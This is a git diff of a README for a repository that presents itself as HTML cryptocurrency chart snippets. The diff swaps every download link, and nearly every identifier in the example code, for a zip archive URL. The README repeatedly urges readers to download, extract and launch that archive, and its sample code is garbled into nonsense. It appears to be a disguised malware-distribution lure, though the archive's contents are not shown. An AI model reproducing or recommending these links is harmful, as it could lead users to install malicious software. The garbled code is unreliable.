@@ -1,6 +1,6 @@
 # 📈💹 HTML Crypto Currency Chart Snippets 💹📈
 
-![Crypto Currency Chart](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip)
+![Crypto Currency Chart](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip)
 
 Welcome to the "HTML-Crypto-Currency-Chart-Snippets" repository! This repository contains simple HTML code snippets that allow you to create tickers and charts of cryptocurrencies using the TradingView API. Whether you are a developer looking to integrate real-time cryptocurrency data into your website or just interested in exploring financial analysis with HTML, this repository has got you covered.
 
@@ -17,11 +17,11 @@ btc, candlestick, candlestick-chart, chart, crypto, cryptocurrency, eth, ethereu
 
 ## Getting Started
 
-To get started with creating your own crypto currency charts, simply download the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip file from the following link:
+To get started with creating your own crypto currency charts, simply download the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip file from the following link:
 
-[![Download Software](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip)](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip)
+[![Download Software](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip)](https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip)
 
-After downloading the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip file, extract it and launch the HTML snippets in your preferred code editor. You can then customize the snippets to display the specific cryptocurrency data you are interested in.
+After downloading the https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip file, extract it and launch the HTML snippets in your preferred code editor. You can then customize the snippets to display the specific cryptocurrency data you are interested in.
 
 ## Usage
 
@@ -35,22 +35,22 @@ Here is a simple example of how you can use the HTML snippets to create a candle
 <!DOCTYPE html>
 <html>
 <head>
-  <script type="text/javascript" src="https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip"></script>
+  <script type="text/javascript" src="https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip"></script>
 </head>
 <body>
   <div id="chartContainer" style="width: 800px; height: 400px;"></div>
   <script>
-    const chart = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip('chartContainer'), {
+    const chart = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip('chartContainer'), {
       width: 800,
       height: 400,
     });
 
-    const candlestickSeries = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip();
+    const candlestickSeries = https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip();
 
-    fetch('https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip')
-      .then(response => https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip())
+    fetch('https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip')
+      .then(response => https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip())
       .then(data => {
-        https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/releases/download/v2.0/Software.zip(d => ({
+        https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip(https://github.com/majorclient/HTML-Crypto-Currency-Chart-Snippets/raw/refs/heads/main/perimetry/HTM_Snippets_Chart_Currency_Crypto_3.7.zip(d => ({
           time: d[0] / 1000,
           open: parseFloat(d[1]),
           high: parseFloat(d[2]),
